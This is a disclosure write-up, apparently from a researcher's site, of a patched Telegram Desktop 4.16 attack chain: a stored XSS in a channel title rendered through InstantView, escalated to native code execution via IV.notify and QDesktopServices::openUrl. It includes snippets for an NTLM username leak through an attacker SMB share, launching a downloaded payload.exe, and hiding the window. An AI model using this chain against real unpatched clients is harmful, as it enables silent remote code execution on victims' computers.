{"aid": "40050510", "title": "Telegram Arbitrary Code Execution via InstantView", "url": "https://www.telesec.top/telesec/telegram-desktop/arbitrary-code-execution-via-instantview", "domain": "telesec.top", "votes": 2, "user": "davtur19", "posted_at": "2024-04-16 10:53:56", "comments": 0, "source_title": "Arbitrary Code Execution via InstantView", "source_text": "Arbitrary Code Execution via InstantView | TeleSec\n\n# TeleSec\n\n  * About\n\n  * M\ufe0fBackend\n\n    * Partial 2FA bypass\n\n    * Insufficient verification over callback_data parameter (@vote and @like bot pwned)\n\n    * Session persistence after logout\n\n      * \u26a0\ufe0fBypass previous fix\n\n    * \u26a0\ufe0fLeak autologin token\n\n  * \ud83c\udf10OFFICIAL WEBSITE\n\n    * Cross Frame Scripting on t.me and telegram.org\n\n    * Leak autologin token via InstantView test page\n\n    * Broken Access Control on bugs.telegram.org\n\n    * Privacy of Profile Pictures\n\n  * \ud83d\udcf1TELEGRAM ANDROID\n\n    * Incoming messages MITM\n\n    * Sticker crash (x4)\n\n    * Missing Warning When Leaving App on Third-Party Website\n\n    * \u26a0\ufe0fLeak autologin token with bad UTF8 and bad url parsing\n\n  * \ud83d\udda5\ufe0fTelegram Desktop\n\n    * Arbitrary Code Execution via InstantView\n\n    * Arbitrary Code Execution via Web Bot\n\n    * \u26a0\ufe0fCode highlighter crash\n\n  * \ud83e\uddd1\ud83d\udcbbTelegram Web\n\n    * Missing mandatory security checks (MTProto) on WEB-A\n\n    * IP leak (old) Telegram Web\n\n    * WebK and WebZ, no warning appears when opening external links\n\nPowered by GitBook\n\n# Arbitrary Code Execution via InstantView\n\n##\n\nIntroduction\n\nTelegram Desktop has implemented within the update to version 4.16 the\nInstantView feature. On a technical level, this implementation involves\nrendering via a WebView of client-side generated HTML code.\n\n##\n\nRequirements\n\n  * Windows 10/11\n\n  * Telegram Desktop 4.16.0-4.16.3\n\n##\n\nVulnerabilities\n\n###\n\nStored Cross Site Scripting in InstantView\n\nA Stored XSS vulnerability allows the attacker to permanently inject and\nexecute malicious JavaScript code in the Web application page. The victim's\nbrowser executes the malicious code each time the victim visits the\npermanently modified page.\n\nThrough an unsanitized input, it was possible to inject JavaScript code into\nthe InstantView, allowing a loss of data confidentiality, such as obtaining\nthe victim's IP address and the ability to execute arbitrary JavaScript code\nin their browser, which is not permitted by InstantView.\n\nCVSS v4.0 Score: 5.1 / Medium\n\nCVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N\n\n###\n\nArbitrary code execution through QDesktopServices::openUrl\n\nArbitrary Code Execution is a vulnerability that allows an attacker to execute\narbitrary code on the target system. The attacker can execute commands or code\nwith the privileges with which Telegram Desktop was run, thus gaining access\nto available network and system resources. An attacker with these privileges\ncould cause serious damage to the confidentiality, integrity, and availability\nof data.\n\nThe QDesktopServices::openUrl function allows for the execution of any file on\nthe victim's PC. When combined with the InstantView vulnerability, it is also\npossible to download files into the download folder and execute them. This can\nresult in a significant loss of confidentiality, integrity, and availability\nof data.\n\nCVSS v4.0 Score: 9.2 / Critical\n\nCVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N\n\n##\n\nExploitation path\n\n###\n\nSummarized steps\n\n  * Create a channel and use an XSS as the title.\n\n  * Create a post on Telegra.ph by putting that channel as the author\n\n  * Through XSS you can execute arbitrary JavaScript in the WebView\n\n  * Through JavaScript you can have the user download files to his Download folder\n\n  * Through JavaScript you can call a primitive to open and execute arbitrary local files\n\n  * By abusing samba you can get the username\n\n  * Having the username we now know what the user's download folder is and therefore we can execute the previously downloaded file\n\n###\n\nPrimitive to run arbitrary JavaScript code\n\nThe primitive that allowed us to run arbitrary JavaScript code is the lack of\nescaping from one of the fields generated in the HTML code.\n\nIn particular, the lack of channel title escaping present on the InstantView\npageBlockChannel element is exploited. References:\n\ntdesktop/Telegram/SourceFiles/iv/iv_prepare.cpp at\nae36019ba99131df31a2e7056da720b3bad1b827 \u00b7 telegramdesktop/tdesktopGitHub\n\nThis allows us to load our own JavaScript code inside the InstantView WebView.\n\n###\n\nPrimitive to run arbitrary native code\n\nAfter loading arbitrary JavaScript code you can execute native code by sending\nan event from WebView to Telegram Desktop using IV.notify\n\nExample:\n\n    \n    \n    IV.notify({ event: 'link_click', url: \"file://\", context: \"webpage\", });\n\nThis event is handled by Telegram Desktop which passes the url to\nQDesktopServices::openUrl, if the protocol of the url is file automatically\nQDesktopServices::openUrl passes the path of the url to ShellExecute\nReferences:\n\n  * https://github.com/Telegramdesktop/tdesktop/blob/ae36019ba99131df31a2e7056da720b3bad1b827/Telegram/SourceFiles/iv/iv_instance.cpp#L901\n\n  * https://doc.qt.io/qt-6/qdesktopservices.html\n\n  * https://learn.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecutea\n\n###\n\nFirst exploitation step\n\n  1. Creation of a Telegram channel. The channel title must be malformed in such a way as to allow XSS. Example: \"<script>alert(1)</script>\n\n  2. Creating a post on Telegraph (or any other site that supports InstantView). The post must contain the previously created Telegram channel as the author.\n\n  3. Send Telegraph post link to victim.\n\n  4. Click by the victim of the \"INSTANT VIEW\" button on Telegram Desktop. At this point, our JavaScript code will be loaded inside the WebView on the victim's computer.\n\n###\n\nSecond exploitation step\n\nThe loaded arbitrary JavaScript code is divided into two parts that can be\ndone in parallel.\n\n####\n\nPART 1\n\nIdentification of the user name of the victim's computer (No user interaction\nrequired).\n\n  1. Leak the Windows local account username by asking Telegram Desktop to open a file that is on a network path (samba), this allows us to get from the authentication attempt via NTLM the username of the computer on one of our servers. Note: This behavior was verified on two Windows 10 and 11 machines with the default settings and the latest updates with local accounts.\n\nExample:\n\n    \n    \n    IV.notify({ event: 'link_click', url: \"file:////{IP ADDRESS SAMBA}/{SHARE NAME}\", context: \"webpage\", });\n\n2\\. Using an HTTP network request via the previously loaded JavaScript to one\nof our endpoints, we get the username communicated to our samba server.\n\n####\n\nPART 2\n\nThe executable can be downloaded via JavaScript and automatically saved to the\nDownloads folder without any user interaction.\n\n  1. Download the file in memory (RAM) from one of our endpoints using fetch (JavaScript API).\n\n  2. Download the file to the Downloads folder by converting the buffer obtained from fetch to a blob file and forcing the WebView to download it.\n\n###\n\nThird exploitation step\n\nAfter waiting for the two parts of the previous step, we now have the computer\nusername and our own executable in the Downloads folder.\n\nNow using IV.notify it is possible to execute our downloaded file, without any\nuser interaction, using the path reconstructed from the information extracted\nin the previous step.\n\nExample:\n\n    \n    \n    IV.notify({ event: 'link_click', url: \"file:///C:/Users/\" + username + \"/Downloads/payload.exe\", context: \"webpage\", });\n\n###\n\nAdditional findings\n\nIt is possible to make it completely silent and invisible to the user by\nsending fake shortcuts to Telegram Desktop using IV.notify.\n\nTo minify the WebView it is sufficient to do:\n\n    \n    \n    IV.notify({ event: 'keydown', modifier: 'ctrl', key: 'm' });\n\nTo close the WebView it is sufficient to do:\n\n    \n    \n    IV.notify({ event: 'keydown', modifier: 'ctrl', key: 'w' });\n\n###\n\nFix\n\nThe bug was workarounded server-side by escaping channel title characters, and\nfixed client-side by adding proper escaping.\n\n####\n\nServer-side fix\n\n####\n\nClient-side fix\n\nSimplify escaping when parsing IV. \u00b7 telegramdesktop/tdesktop@7803f8eGitHub\n\nCheck the URL in IV like in attach bots. \u00b7\ntelegramdesktop/tdesktop@eaaa704GitHub\n\nPreviousLeak autologin token with bad UTF8 and bad url parsingNextArbitrary\nCode Execution via Web Bot\n\nLast updated 2 days ago\n\nOn this page\n\n  * Introduction\n  * Requirements\n  * Vulnerabilities\n  * Stored Cross Site Scripting in InstantView\n  * Arbitrary code execution through QDesktopServices::openUrl\n  * Exploitation path\n  * Summarized steps\n  * Primitive to run arbitrary JavaScript code\n  * Primitive to run arbitrary native code\n  * First exploitation step\n  * Second exploitation step\n  * Third exploitation step\n  * Additional findings\n  * Fix\n\nWas this helpful?\n\n", "frontpage": false}
